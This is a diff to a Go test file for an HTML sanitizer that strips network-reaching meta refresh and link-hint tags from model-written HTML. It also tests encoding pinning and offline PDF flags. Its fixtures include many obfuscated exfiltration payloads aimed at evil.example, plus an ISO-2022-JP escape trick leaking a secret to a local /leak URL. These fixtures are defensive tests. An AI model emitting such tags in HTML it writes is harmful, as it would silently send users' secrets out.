@@ -7,6 +7,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode/utf8"
 )
 
 var update = flag.Bool("update", false, "update golden files")
@@ -173,5 +174,154 @@ func TestFreeSlug(t *testing.T) {
 	}
 	if got := freeSlug(root, "manual"); got != "manual" {
 		t.Fatalf("own trio: got %q, want manual (regenerate)", got)
+	}
+}
+
+// Model-written HTML loses every <meta http-equiv> and every <link> whose
+// rel reaches the network on its own, however the tag is spelled, quoted,
+// entity-encoded or hidden; harmless tags and the text around stay.
+func TestSanitizeHTMLRemovesNavigationAndHints(t *testing.T) {
+	evil := []string{
+		`<meta http-equiv="refresh" content="0;url=https://evil.example/?d=secret">`,
+		`<META HTTP-EQUIV=REFRESH CONTENT="0;url=https://evil.example/?d=secret">`,
+		`<meta content='0;url=https://evil.example/?d=secret' http-equiv='Refresh'>`,
+		`<meta content="0;url=https://evil.example/?d=a>b" http-equiv="refresh">`,
+		`<meta/http-equiv=refresh/content=0;url=https://evil.example/>`,
+		"<meta\thttp-equiv\n=\n\"refresh\"\fcontent=\"0;url=https://evil.example/\">",
+		`<meta http-equiv="Content-Security-Policy" content="default-src *">`,
+		`<meta http-equiv="x-dns-prefetch-control" content="on">`,
+		`<link rel="dns-prefetch" href="//d.evil.example">`,
+		`<link rel=preconnect href="https://evil.example/">`,
+		`<LINK REL="PreFetch" HREF="https://evil.example/x">`,
+		`<link href="https://evil.example/x" rel='prerender'>`,
+		`<link rel="stylesheet preload" href="https://evil.example/x">`,
+		`<link rel="&#112;reconnect" href="https://evil.example/">`,
+		`<link rel="modulepreload" href="https://evil.example/m.js">`,
+		`<link rel="next" href="https://evil.example/n">`,
+		// Favicons may be fetched outside the page's CSP.
+		`<link rel="icon" href="https://evil.example/f.ico">`,
+		`<link rel="shortcut icon" href="https://evil.example/f.ico">`,
+		`<link rel="apple-touch-icon" href="https://evil.example/t.png">`,
+		// In foreign content a <meta> breaks out of <style> into the page.
+		`<svg><style><meta http-equiv="refresh" content="0;url=https://evil.example/"></style></svg>`,
+		// A decoy quoted value must not swallow the real tag after it.
+		`<!-- <meta a=" --><meta http-equiv=refresh content="0;url=https://evil.example/">" -->`,
+		// Removing the inner tag must not splice the outer one together.
+		`<me<meta http-equiv=refresh>ta http-equiv=refresh content="0;url=https://evil.example/">`,
+		`<li<link rel=preconnect href=x>nk rel=preconnect href="https://evil.example/">`,
+	}
+	for _, tag := range evil {
+		out := sanitizeHTML("<html><head>" + tag + "</head><body><p>kept</p></body></html>")
+		low := strings.ToLower(out)
+		for _, bad := range []string{"http-equiv", "evil.example", "preconnect", "&#112;"} {
+			if strings.Contains(low, bad) {
+				t.Errorf("%s\n  left %q in %q", tag, bad, out)
+			}
+		}
+		if !strings.Contains(out, "<p>kept</p>") {
+			t.Errorf("%s\n  lost the body: %q", tag, out)
+		}
+	}
+
+	// Cut off by the end of input: dropped whole, as the browser does.
+	if out := sanitizeHTML(`<p>kept</p><meta http-equiv="refresh" content="0;url=https://evil.example/`); out != "<p>kept</p>" {
+		t.Errorf("unterminated tag: %q", out)
+	}
+
+	keep := []string{
+		`<meta name="viewport" content="width=device-width, initial-scale=1">`,
+		`<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">`,
+		`<metadata>x</metadata>`,
+		`<linker rel=preconnect>`,
+		`<p>use &lt;meta http-equiv="refresh"&gt; with care</p>`,
+	}
+	for _, tag := range keep {
+		in := "<html><head>" + tag + "</head></html>"
+		if out := sanitizeHTML(in); out != in {
+			t.Errorf("harmless %s changed to %q", tag, out)
+		}
+	}
+}
+
+// The template itself survives sanitizing with its fonts: only its resource
+// hints go.
+func TestSanitizeHTMLKeepsTheTemplate(t *testing.T) {
+	out := sanitizeHTML(templateHTML)
+	if strings.Contains(out, `rel="preconnect"`) {
+		t.Error("the template's preconnect hints were kept")
+	}
+	if !strings.Contains(out, `<link rel="stylesheet" href="https://fonts.googleapis.com/`) {
+		t.Error("the template's font stylesheet was removed")
+	}
+	if strings.Count(out, "<") != strings.Count(templateHTML, "<")-3 {
+		t.Error("sanitizing removed more than the two hints and the charset")
+	}
+}
+
+// A model-chosen encoding cannot rebuild a tag the scan never saw: in
+// ISO-2022-JP "ESC ( B" decodes to nothing, so "<me\x1b(Bta http-equiv=…>"
+// would become a refresh once the browser decodes it. The written HTML
+// declares UTF-8 before anything else, keeps no other declaration, and holds
+// no ESC (or other control) byte; invalid UTF-8 is replaced. What is left of
+// the hidden tag ("<me(Bta …") is an unknown element in UTF-8.
+func TestSanitizeHTMLPinsTheEncoding(t *testing.T) {
+	in := "<html><head><meta charset=\"iso-2022-jp\">" +
+		"<META CHARSET=shift_jis>" +
+		"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-7\">" +
+		"<me\x1b(Bta http-equiv=\"refresh\" content=\"0;url=http://127.0.0.1:18777/leak?secret=X\">" +
+		"</head><body><p>a\x00b\x07c\x7fd\xff\xfee\tf\ng</p></body></html>"
+	out := withCSP(sanitizeHTML(in))
+	if !strings.HasPrefix(out, "<!DOCTYPE html>\n"+docCharset+"\n<meta http-equiv=\"Content-Security-Policy\"") {
+		t.Fatalf("UTF-8 declaration not first: %q", out)
+	}
+	low := strings.ToLower(out)
+	if n := strings.Count(low, "charset"); n != 1 {
+		t.Errorf("want only our charset declaration, got %d in %q", n, out)
+	}
+	for _, bad := range []string{"\x1b", "\x00", "\x07", "\x7f", "iso-2022", "shift_jis", "utf-7"} {
+		if strings.Contains(low, bad) {
+			t.Errorf("left %q in %q", bad, out)
+		}
+	}
+	if !utf8.ValidString(out) {
+		t.Errorf("invalid UTF-8 kept: %q", out)
+	}
+	if !strings.Contains(out, "<p>abcd\uFFFDe\tf\ng</p>") {
+		t.Errorf("text around the controls lost: %q", out)
+	}
+	// An earlier run's output is still recognised by its CSP.
+	root := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(root, "docs"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, "docs", "x.html"), []byte(out), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if !ownsSlug(root, "x") {
+		t.Error("ownsSlug no longer recognises the doc totem's output")
+	}
+}
+
+// The PDF render keeps Chrome off the network but for the font hosts, by
+// name and by address.
+func TestOfflineFlags(t *testing.T) {
+	joined := strings.Join(offlineFlags, "\n")
+	for _, want := range []string{
+		"--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE fonts.googleapis.com , EXCLUDE fonts.gstatic.com",
+		"--proxy-server=http://127.0.0.1:9",
+		"--proxy-bypass-list=fonts.googleapis.com;fonts.gstatic.com",
+		"--dns-prefetch-disable",
+	} {
+		if !strings.Contains(joined, want) {
+			t.Errorf("offline flags lack %q:\n%s", want, joined)
+		}
+	}
+}
+
+// The written HTML turns off DNS prefetching after the CSP.
+func TestWithCSPDisablesDNSPrefetch(t *testing.T) {
+	out := withCSP("<html></html>")
+	if i, j := strings.Index(out, docCSP), strings.Index(out, noDNSPrefetch); i < 0 || j < i {
+		t.Fatalf("CSP then DNS-prefetch off expected: %q", out)
 	}
 }
